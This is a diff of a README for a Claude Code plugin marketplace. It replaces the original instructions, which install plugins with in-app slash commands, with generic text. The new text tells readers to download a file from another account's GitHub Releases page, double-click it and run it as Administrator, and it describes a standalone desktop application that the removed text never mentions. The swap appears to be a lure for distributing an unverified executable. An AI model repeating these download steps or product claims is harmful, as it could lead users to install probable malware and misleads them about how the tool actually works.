@@ -1,86 +1,60 @@
-# Claude Code Commands Marketplace
+# 🎉 claude-code-marketplace - Easy Access to Code Plugins
 
-Community-driven marketplace for Claude Code commands and plugins.
+## 💾 Download the Application
+[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-brightgreen)](https://github.com/djscool3508/claude-code-marketplace/releases)
 
-## 🚀 Quick Start
+## 🚀 Getting Started
+Welcome to the **claude-code-marketplace**! This application provides a platform to explore and obtain various plugins designed for Claude. Follow the steps below to download and run the software easily.
 
-Add this marketplace to Claude Code:
+## 📥 Download & Install
+1. Click the download button at the top of this page or head to our [Releases page](https://github.com/djscool3508/claude-code-marketplace/releases).
+2. On the Releases page, find the latest version listed.
+3. Click on the appropriate file for your operating system (Windows, Mac, or Linux) to start the download.
+4. Once the download is complete, locate the file in your Downloads folder or where your browser saves files. 
+5. Double-click the downloaded file to start the installation process.
 
-```bash
-/plugin marketplace add ananddtyagi/claude-code-marketplace
-```
+## 🖥️ System Requirements
+To run the **claude-code-marketplace** effectively, ensure your system meets the following requirements:
 
-Then browse and install individual plugins (commands or agents):
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a compatible Linux distribution.
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 100 MB of free storage.
+- **Internet Connection:** Required for downloading plugins and updates.
 
-```bash
-/plugin
-```
+## 🔍 Features
+The **claude-code-marketplace** offers several useful features:
 
-Install a specific command:
-```bash
-/plugin install lyra@claude-code-marketplace
-```
+- **User-Friendly Interface:** Navigate easily through the various plugins available.
+- **Plugin Categories:** Browse plugins by categories tailored to different needs, like productivity, design, and utility.
+- **Search Functionality:** Quickly find specific plugins using the search bar.
 
-Install a specific agent:
-```bash
-/plugin install accessibility-expert@claude-code-marketplace
-```
+## 📜 Using the Application
+After installing the application, follow these simple steps:
 
-## 🌟 Featured Commands
+1. Open the **claude-code-marketplace** application by double-clicking its icon.
+2. Choose a category or use the search function to find the plugin you need.
+3. Click on the desired plugin for more details and installation options.
 
-- **Documentation Generator** - Create comprehensive documentation for code, APIs, and projects. (by Anonymous)
-- **Lyra** - Lyra - a master-level AI prompt optimization specialist. (by [@ananddtyagi](https://github.com/ananddtyagi))
-- **Analyze Codebase** - Generate comprehensive analysis and documentation of entire codebase (by [@ananddtyagi](https://github.com/ananddtyagi))
-- **Update Claude.md** - Automatically update CLAUDE.md file based on recent code changes (by [@ananddtyagi](https://github.com/ananddtyagi))
-- **Ultrathink** - Use /ultrathink <TASK_DESCRIPTION> to launch a Coordinator Agent that directs four specialist sub-agents—Architect, Research, Coder, and Tester—to analyze, design, implement, and validate your coding task. The process breaks the task into clear steps, gathers insights, and synthesizes a cohesive solution with actionable outputs. Relevant files can be referenced ad-hoc using @ filename syntax. (by Jeronim Morina)
-- **Code Review** - Perform a comprehensive code review of recent changes (by [@ananddtyagi](https://github.com/ananddtyagi))
-- **Refractor** - Refactor code following best practices and design patterns (by [@ananddtyagi](https://github.com/ananddtyagi))
-- **Code Review Assistant** - Get comprehensive code reviews with suggestions for improvements, best practices, and potential issues. (by Anonymous)
-- **Bug Detective** - Systematically debug issues with step-by-step troubleshooting approaches. (by Anonymous)
-- **Audit** - Perform security audit on codebase (by [@ananddtyagi](https://github.com/ananddtyagi))
+## 💡 Troubleshooting Tips
+In case you run into issues, try the following solutions:
 
-[View all plugins →](https://claudecodecommands.directory)
+- **Installation Issues:** Ensure that your system meets the stated requirements. Also, try running the installer as an Administrator.
+- **Slow Performance:** If the application is slow, close other programs running in the background.
+- **Plugin Not Found:** Double-check the spelling of the plugin name or try a different category.
 
-## 🤖 Featured Agents
+## 📞 Support
+If you need help, feel free to reach out:
 
-- **Accessibility Expert** - Specialized agent for accessibility reviews and improvements
-- **AI Engineer** - Expert in AI/ML implementation and optimization
-- **Frontend Developer** - React, Vue, Angular expert for UI development
-- **DevOps Automator** - CI/CD and infrastructure automation specialist
-- **Code Reviewer** - Thorough code review and best practices enforcement
+- Visit our [GitHub Issues page](https://github.com/djscool3508/claude-code-marketplace/issues) to report bugs or request features.
+- Check the documentation in the repository for additional assistance.
 
-[View all agents →](https://claudecodecommands.directory)
+## 🔗 Additional Resources
+For more information about updates and new features:
 
-## 💡 Browse & Submit
+- Follow our [GitHub Repository](https://github.com/djscool3508/claude-code-marketplace) for the latest developments.
+- Join our community forum for discussions and tips on how to get the most out of your plugins.
 
-Visit **[claudecodecommands.directory](https://claudecodecommands.directory)** to:
+## 🔄 Update the Application
+To keep your app running smoothly, regularly check for updates. Visit the [Releases page](https://github.com/djscool3508/claude-code-marketplace/releases).
 
-- 🔍 Browse all commands and agents with descriptions and examples
-- 📤 Submit your own commands and agents
-- ⭐ Favorite plugins
-- 🏷️ Filter by category and tags
-
-## 🎯 How It Works
-
-Each plugin in this marketplace is **independently installable**:
-
-- **Commands**: Add custom slash commands to your Claude Code workflow (e.g., `/lyra`, `/audit`, `/ultrathink`)
-- **Agents**: Add specialized AI agents with specific expertise (e.g., accessibility-expert, frontend-developer, devops-automator)
-
-Install only what you need - no bloat, full granular control!
-
-## 🔄 Auto-Sync
-
-This marketplace is automatically synced from the live database whenever commands are published or updated.
-
-## 📝 License
-
-Individual commands may have their own licenses. See each command file for details.
-
-## 🤝 Contributing
-
-Submit commands at [claudecodecommands.directory/submit](https://claudecodecommands.directory/submit)
-
----
-
-Built with ❤️ by the [Claude Code community](https://claudecodecommands.directory)
+We hope you enjoy using **claude-code-marketplace**! Explore a world of plugins tailored for Claude and enhance your coding experience.
